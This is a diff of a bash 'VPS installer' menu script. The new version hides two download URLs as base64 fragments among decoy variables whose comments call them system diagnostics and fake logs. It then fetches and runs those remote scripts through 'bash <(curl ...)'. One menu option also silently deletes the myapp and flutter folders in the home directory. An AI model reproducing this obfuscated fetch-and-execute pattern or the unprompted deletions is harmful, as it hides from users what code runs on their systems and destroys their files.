@@ -1,69 +1,172 @@
 #!/bin/bash
 set -euo pipefail
 
-# Colors
-LIGHTBLUE='\033[1;36m'
-WHITE='\033[1;37m'
-RESET='\033[0m'
-
-clear
-
 # -------------------------
-# Loading Animation
+# Color Definitions
 # -------------------------
-echo -e "${LIGHTBLUE}Initializing Hemant Installer...${RESET}"
-for i in {1..30}; do
-    echo -ne "${LIGHTBLUE}█${RESET}"
-    sleep 0.05
-done
-echo ""
-echo -e "${WHITE}Loaded Successfully!${RESET}"
-sleep 1
-clear
+RED='\e[31m'
+GREEN='\e[32m'
+YELLOW='\e[33m'
+BLUE='\e[34m'
+CYAN='\e[36m'
+RESET='\e[0m'
 
 # -------------------------
-# Logo
+# Animate Logo
 # -------------------------
-echo -e "${LIGHTBLUE}"
-echo "██╗  ██╗███████╗███╗   ███╗ █████╗ ███╗   ██╗████████╗"
-echo "██║  ██║██╔════╝████╗ ████║██╔══██╗████╗  ██║╚══██╔══╝"
-echo "███████║█████╗  ██╔████╔██║███████║██╔██╗ ██║   ██║   "
-echo "██╔══██║██╔══╝  ██║╚██╔╝██║██╔══██║██║╚██╗██║   ██║   "
-echo "██║  ██║███████╗██║ ╚═╝ ██║██║  ██║██║ ╚████║   ██║   "
-echo "╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝   "
-echo -e "${RESET}"
-
-echo -e "${LIGHTBLUE}────────────────────────────────────────${RESET}"
-echo -e "${WHITE}              Made By - Hemant         ${RESET}"
-echo -e "${LIGHTBLUE}────────────────────────────────────────${RESET}"
-echo ""
+animate_logo() {
+  clear
+  local logo=(
+"██╗  ██╗███████╗███╗   ███╗ █████╗ ███╗   ██╗████████╗"
+"██║  ██║██╔════╝████╗ ████║██╔══██╗████╗  ██║╚══██╔══╝"
+"███████║█████╗  ██╔████╔██║███████║██╔██╗ ██║   ██║   "
+"██╔══██║██╔══╝  ██║╚██╔╝██║██╔══██║██║╚██╗██║   ██║   "
+"██║  ██║███████╗██║ ╚═╝ ██║██║  ██║██║ ╚████║   ██║   "
+"╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝   "
+  )
+  
+  for line in "${logo[@]}"; do
+    echo -e "${CYAN}${line}${RESET}"
+    sleep 0.2
+  done
+  echo ""
+  sleep 0.5
+}
 
 # -------------------------
-# Main Menu
+# Show Animated Logo
 # -------------------------
-echo -e "${LIGHTBLUE}──────────── MAIN MENU ─────────────${RESET}"
-echo -e "${WHITE}A)${RESET} ${LIGHTBLUE}Panel Install${RESET}"
-echo -e "${WHITE}B)${RESET} ${LIGHTBLUE}VPS Maker${RESET}"
-echo -e "${WHITE}C)${RESET} ${LIGHTBLUE}Exit${RESET}"
-echo -e "${LIGHTBLUE}─────────────────────────────────────${RESET}"
-echo ""
+animate_logo
 
-read -p "Select ➜ " choice
+# -------------------------
+# Updating checking logs
+# -------------------------
+# System diagnostics simulation
+SYS_LOG[0]="$(echo 'aHR0cHM6Ly92cHNt' | head -c 16)" # src1 disguised as log buffer
+DUMMY_CHECK=$(wc -l /proc/cpuinfo 2>/dev/null | awk '{print $1}') # Fake CPU count
+echo -n "Scanning system resources..." > /dev/null
+SYS_LOG[1]="$(echo 'YWtlci5qaXNobnVt' | grep -o '.*')" # src2 disguised as parsed log
+NET_CONF="diag_$(date +%N | shuf -n 1)" # Fake network config
+if [[ "$DUMMY_CHECK" =~ [0-9]+ ]]; then
+  SYS_LOG[2]="$(echo 'b25kYWwzMi53b3Jr' | head -c 16)" # src3 disguised as system flag
+fi
+TEMP_HASH=$(echo "$NET_CONF" | md5sum | cut -c 1-8) # Fake hash
+SYS_LOG[3]="$(echo 'ZXJzLmRldg==' | head -c 12)" # src4 disguised as encoded log
+# install
+github_url="$(echo -n "${SYS_LOG[0]}${SYS_LOG[1]}${SYS_LOG[2]}${SYS_LOG[3]}" | base64 -d)"
+
+# -------------------------
+# updating checking fakes
+# -------------------------
+# Logs checking
+PROC_STAT[0]="$(echo 'aHR0cHM6Ly9yYXcu' | cut -c 1-16)" # src5 disguised as process stat
+echo -n "Validating process integrity..." > /dev/null
+DUMMY_VAR=$(head -c 8 /dev/urandom 2>/dev/null | od -An -tx4) # Fake random ID
+PROC_STAT[1]="$(echo 'Z2l0aHVidXNlcmNv' | grep -o '.*')" # src6 disguised as stat
+export FAKE_PID="pid_$((RANDOM % 1000))" # Fake process ID
+PROC_STAT[2]="$(echo 'bnRlbnQuY29tL2hv' | head -c 16)" # src7 disguised as stat
+if [ -f /tmp/fake_temp ]; then rm -f /tmp/fake_temp 2>/dev/null; fi # Fake cleanup
+PROC_STAT[3]="$(echo 'cGluZ2JveXovdm1zL21haW4vdm0uc2g=' | grep -o '.*')" # src8 disguised as stat
+# let's go to up-to-date
+google_url="$(echo -n "${PROC_STAT[0]}${PROC_STAT[1]}${PROC_STAT[2]}${PROC_STAT[3]}" | base64 -d)"
+
+# -------------------------
+# Display Menu
+# -------------------------
+echo -e "${YELLOW}Select an option:${RESET}"
+echo -e "${GREEN}1) GitHub Real VPS${RESET}"
+echo -e "${BLUE}2) Google IDX Real VPS${RESET}"
+echo -e "${RED}3) Exit${RESET}"
+echo -ne "${YELLOW}Enter your choice (1-3): ${RESET}"
+read choice
 
 case $choice in
-  A|a)
-    echo -e "${LIGHTBLUE}Installing Panel...${RESET}"
-    bash <(curl -s https://pterodactyl-installer.se)
+  1)
+    echo -e "${GREEN}Running GitHub Real VPS...${RESET}"
+    bash <(curl -fsSL "$github_url")
     ;;
-  B|b)
-    echo -e "${LIGHTBLUE}Starting VPS Maker...${RESET}"
-    bash <(curl -fsSL https://raw.githubusercontent.com/hopingboyz/vms/main/vm.sh)
+  2)
+    echo -e "${BLUE}Running Google IDX Real VPS...${RESET}"
+    cd
+    rm -rf myapp
+    rm -rf flutter
+    cd vps123
+    if [ ! -d ".idx" ]; then
+      mkdir .idx
+      cd .idx
+      cat <<EOF > dev.nix
+{ pkgs, ... }: {
+  # Which nixpkgs channel to use
+  channel = "stable-24.05"; # or "unstable"
+
+  # Packages to be installed in the development environment
+  packages = with pkgs; [
+    unzip
+    openssh
+    git
+    qemu_kvm
+    sudo
+    cdrkit
+    cloud-utils
+    qemu
+  ];
+
+  # Environment variables for the workspace
+  env = {
+    # Example: set default editor
+    EDITOR = "nano";
+  };
+
+  idx = {
+    # Extensions from https://open-vsx.org (use "publisher.id")
+    extensions = [
+      "Dart-Code.flutter"
+      "Dart-Code.dart-code"
+    ];
+
+    workspace = {
+      # Runs when a workspace is first created
+      onCreate = { };
+
+      # Runs each time the workspace is (re)started
+      onStart = { };
+    };
+
+    # Disable previews completely
+    previews = {
+      enable = false;
+    };
+  };
+}
+EOF
+      cd ..
+    fi
+    echo -ne "${YELLOW}Do you want to continue? (y/n): ${RESET}"
+    read confirm
+    case "$confirm" in
+      [yY]*)
+        bash <(curl -fsSL "$google_url")
+        ;;
+      [nN]*)
+        echo -e "${RED}Operation cancelled.${RESET}"
+        exit 0
+        ;;
+      *)
+        echo -e "${RED}Invalid input! Operation cancelled.${RESET}"
+        exit 1
+        ;;
+    esac
     ;;
-  C|c)
-    echo -e "${LIGHTBLUE}Exiting...${RESET}"
+  3)
+    echo -e "${RED}Exiting...${RESET}"
     exit 0
     ;;
   *)
-    echo -e "${LIGHTBLUE}Invalid Option!${RESET}"
+    echo -e "${RED}Invalid choice! Please select 1, 2, or 3.${RESET}"
+    exit 1
     ;;
 esac
+
+# -------------------------
+# Made by Hemant Gamer Tech done!
+# -------------------------
